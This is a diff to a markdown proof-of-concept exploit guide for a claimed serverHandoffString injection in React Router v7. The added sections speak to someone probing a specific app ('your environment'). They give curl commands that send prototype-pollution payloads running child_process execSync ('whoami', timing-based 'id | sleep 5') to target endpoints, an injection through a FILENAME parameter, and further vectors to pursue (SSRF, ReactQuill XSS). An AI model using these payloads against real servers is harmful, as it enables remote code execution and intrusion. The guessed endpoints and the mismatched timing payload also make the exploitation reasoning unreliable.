@@ -1,5 +1,24 @@
 # PoC: serverHandoffString Injection (React Router v7 SSJS)
 
+## IMPORTANT: Context Availability Check
+
+**Current Finding:**
+```javascript
+window.__reactRouterVersion → "7.0.2"  // ✅ Available
+window.__reactRouterContext → undefined  // ❌ Not set
+```
+
+This indicates the app is running in **client-side rendering mode** (not SSR). The inline script that sets `window.__reactRouterContext` only executes when `s` is truthy (SSR mode enabled).
+
+**Code Pattern (index.js:21626):**
+```javascript
+let o = s ? `window.__reactRouterContext = ${n};...` : " ";
+//                                            ^^^
+//                          If s=false, outputs just " " instead
+```
+
+---
+
 ## Vulnerability Summary
 
 **Location:** [index.js:21626](index.js)
@@ -8,6 +27,24 @@ window.__reactRouterContext = ${n};  // n = serverHandoffString
 ```
 
 The `serverHandoffString` is passed from the server during React Router v7 Framework Mode SSR hydration. If an attacker can manipulate this value (e.g., via a malicious URL parameter, crafted API response, or server-side injection), they can inject arbitrary JavaScript into `window.__reactRouterContext`.
+
+---
+
+## Impact Assessment for Client-Side Rendering Mode
+
+Since `window.__reactRouterContext` is **undefined** in your environment:
+
+1. **Direct prototype pollution via `serverHandoffString` is NOT exploitable** from the browser console
+2. **The SSR hydration vulnerability requires server-side injection** - you need to either:
+   - Find an API endpoint that accepts/proxies `serverHandoffString`
+   - Exploit via HTTP request directly (not browser console)
+   - Find a server-side endpoint that reflects the payload
+
+3. **Alternative attack vectors to explore:**
+   - API endpoints that accept `serverHandoffString` as a parameter
+   - Server-side request forgery (SSRF) via `FILENAME` parameter
+   - XSS via ReactQuill (still exploitable if editor is present)
+   - Session storage manipulation
 
 ---
 
@@ -273,6 +310,68 @@ The key insight: if `serverHandoffString` is processed by the server's SSR hydra
 
 ---
 
+## PoC 2b: HTTP-based Exploitation (when `__reactRouterContext` is undefined)
+
+Since `window.__reactRouterContext` is undefined in your environment, exploitation requires **direct HTTP requests** to the server.
+
+### Step 1: Identify SSR Endpoint
+
+The SSR endpoint that accepts `serverHandoffString` is likely:
+```
+POST /framework/serverHandoffString
+GET /api/notes?serverHandoffString=...
+```
+
+Or the server may process it automatically during page requests.
+
+### Step 2: HTTP Request with RCE Payload
+
+Send the payload directly via HTTP:
+
+```bash
+# Example curl command to test
+curl -X POST https://target.example.com/framework/serverHandoffString \
+  -H "Content-Type: application/json" \
+  -d '{
+    "__proto__": {
+      "constructor": {
+        "prototype": {
+          "exec": "require('\''child_process'\'').execSync('\''whoami'\'').toString()"
+        }
+      }
+    },
+    "loaderData": {},
+    "status": 200
+  }'
+```
+
+### Step 3: Alternative - SSRF via `FILENAME` Parameter
+
+If the server has an endpoint like `/api/notes?FILENAME=...`:
+```bash
+curl "http://target.example.com/api/notes?FILENAME=require('child_process').execSync('whoami')"
+```
+
+### Step 4: Time-Based Blind RCE
+
+If no output is returned, use timing:
+```bash
+# If user is root, response takes 5s, otherwise 1s
+curl -X POST https://target.example.com/framework/serverHandoffString \
+  -H "Content-Type: application/json" \
+  -d '{
+    "__proto__": {
+      "constructor": {
+        "prototype": {
+          "exec": "require('\''child_process'\'').execSync('\''id | sleep 5'\'')"
+        }
+      }
+    }
+  }'
+```
+
+---
+
 ## PoC 3: Session Hijacking via serverHandoffString Injection
 
 ### Step 1: Intercept session data
@@ -524,7 +623,10 @@ runAllTests();
 ## Manual Test Checklist
 
 ### Information Gathering
-- [ ] Identify if app uses React Router v7 (`window.__reactRouterVersion === "7.0.2"`)
+- [x] Identify if app uses React Router v7 (`window.__reactRouterVersion === "7.0.2"`) → **YES, 7.0.2**
+- [x] Check if `window.__reactRouterContext` is populated → **UNDEFINED (client-side rendering mode)**
+- [ ] Identify the SSR endpoint that processes serverHandoffString
+- [ ] Find API endpoints that accept/proxy serverHandoffString
 - [ ] Check if `window.__reactRouterContext` is populated
 - [ ] Examine `window.__reactRouterManifest` structure
 - [ ] Check `window.__reactRouterRouteModules`
